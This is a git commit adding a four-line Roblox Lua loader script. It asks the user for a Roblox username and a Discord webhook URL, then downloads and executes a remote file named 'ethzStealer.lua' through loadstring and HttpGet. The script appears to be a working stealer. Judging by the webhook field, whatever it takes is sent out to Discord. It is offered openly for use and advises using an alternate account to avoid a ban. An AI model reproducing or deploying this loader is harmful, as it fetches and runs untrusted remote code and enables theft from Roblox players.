bfb151f636fe47ab037b4f5560fed1f49bc8c6bf
ethz <135509198+ethz07@users.noreply.github.com>
2024-09-08 16:16:45 +0300

    Create ethzLoader.lua

---
+++ ethzLoader.lua
@@ -0,0 +1,4 @@
+User_Name = "" -- enter here ur roblox username this have risk of u getting banned (rarely) so use an alt acc Example: User_Name = "Roblox"
+Web_Hook = "" -- enter here ur webhook url Example: Web_Hook = "https://discord.com/api/webhooks/xxxxxx"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ethz07/ethzScripts-ADM/main/ethzStealer.lua"))()
+-- READ README.MD
